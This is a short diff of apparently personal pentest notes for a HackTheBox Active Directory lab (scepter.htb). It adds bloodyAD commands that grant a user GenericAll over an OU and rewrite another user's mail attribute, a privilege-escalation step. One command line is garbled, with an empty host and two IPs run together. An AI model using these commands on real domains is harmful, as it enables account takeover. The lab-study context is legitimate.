@@ -10,8 +10,13 @@ dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.and
 
 
 
+![file:///tmp/.IQNH82/1.png](file:///tmp/.IQNH82/1.png)
+
+
 ```bash
+bloodyAD -d scepter.htb -u a.carter -p 'Password123' --host  --dc-ip 10.129.231.9210.129.10.255 add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter
+```
 
-dacledit.py -action 'read' -principal 'naugustine' -target-dn 'CN=AD01-SRV1,OU=SERVERS,DC=corp,DC=com' 'corp.com'/'naugustine':'Password1'
-
+```bash
+bloodyAD -d scepter.htb -u a.carter -p 'Password123' --host dc01.scepter.htb --dc-ip 10.129.231.92 set object d.baker mail -v h.brown@scepter.htb
 ```
